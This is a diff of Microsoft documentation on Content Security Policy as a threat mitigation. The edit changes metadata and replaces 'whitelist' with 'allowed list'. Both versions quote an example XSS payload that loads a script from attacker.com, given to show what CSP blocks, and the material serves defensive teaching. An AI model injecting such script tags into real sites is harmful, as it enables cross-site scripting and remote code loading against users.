@@ -1,7 +1,7 @@
 ---
 title: Configuration management for the Microsoft Threat Modeling Tool 
 titleSuffix: Azure
-description: mitigations for threats exposed in the Threat Modeling Tool 
+description: Learn about configuration management for the Threat Modeling Tool. See mitigation information and view code examples.
 services: security
 documentationcenter: na
 author: jegeib
@@ -17,7 +17,7 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-
+ms.custom: "devx-track-js, devx-track-csharp"
 ---
 
 # Security Frame: Configuration Management | Mitigations 
@@ -42,7 +42,7 @@ ms.author: jegeib
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
 | **References**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Content Security Policy Reference](https://content-security-policy.com/), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is a whitelist-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in 2 ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP's Base Restriction-1</li><li>Inject `<script src="http://attacker.com/maliciousCode.js"/>`. This exploit will not work since the attacker controlled domain will not be in CSP's whitelist of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP's whitelist</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
+| **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is a allowed list-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in 2 ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP's Base Restriction-1</li><li>Inject `<script src="http://attacker.com/maliciousCode.js"/>`. This exploit will not work since the attacker controlled domain will not be in CSP's allowed list of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP's allowed list</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
 
 ### Example
 Example policy: 
